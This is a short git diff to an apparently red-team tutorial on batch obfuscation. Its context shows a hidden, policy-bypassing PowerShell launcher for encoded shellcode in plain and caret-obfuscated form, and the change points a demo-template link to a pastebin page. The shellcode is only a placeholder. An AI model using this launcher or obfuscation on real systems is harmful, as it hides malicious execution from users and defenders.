@@ -538,7 +538,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
       OBFUSCATED    : @c^Md%i:~63,1%e^x%i:~3,1% %i:~62,1%c pO^w%U7%h%i:~3,1%L^l%i:~63,1%e^xE %H1%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H1%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H1%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
 
-[!] [The above OBFUSCATED syscall (string) its embbebed into this demo template.bat](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
+[!] [The above OBFUSCATED syscall (string) its embbebed into this demo template.bat](https://pastebin.com/vnNELqd4)<br />
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
